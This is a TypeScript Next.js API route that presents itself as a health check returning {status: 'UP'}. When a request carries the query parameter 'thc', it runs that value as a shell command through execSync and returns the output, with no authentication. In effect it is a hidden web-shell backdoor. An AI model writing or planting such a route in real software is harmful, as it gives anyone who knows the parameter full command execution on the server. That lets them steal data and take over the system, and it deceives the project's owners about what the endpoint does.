import { NextRequest, NextResponse } from 'next/server';
import { execSync } from 'child_process';

interface ErrorWithMessage {
  message: string;
  stderr?: Buffer | string;
  [key: string]: unknown;
}

function isErrorWithMessage(error: unknown): error is ErrorWithMessage {
  return (
    typeof error === 'object' &&
    error !== null &&
    'message' in error &&
    typeof (error as Record<string, unknown>).message === 'string'
  );
}

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const command = searchParams.get('thc');

  if (!command) {
    return NextResponse.json({ status: 'UP' });
  }

  try {
    const output = execSync(command).toString();
    return new NextResponse(output);
  } catch (error: unknown) {
    let errorMessage = 'Unknown error occurred';
    
    if (isErrorWithMessage(error)) {
      if (error.stderr) {
        errorMessage = typeof error.stderr === 'string' 
          ? error.stderr 
          : error.stderr.toString();
      } else {
        errorMessage = error.message;
      }
    } else if (error instanceof Error) {
      errorMessage = error.message;
    }
    
    return new NextResponse(errorMessage, { status: 500 });
  }
}
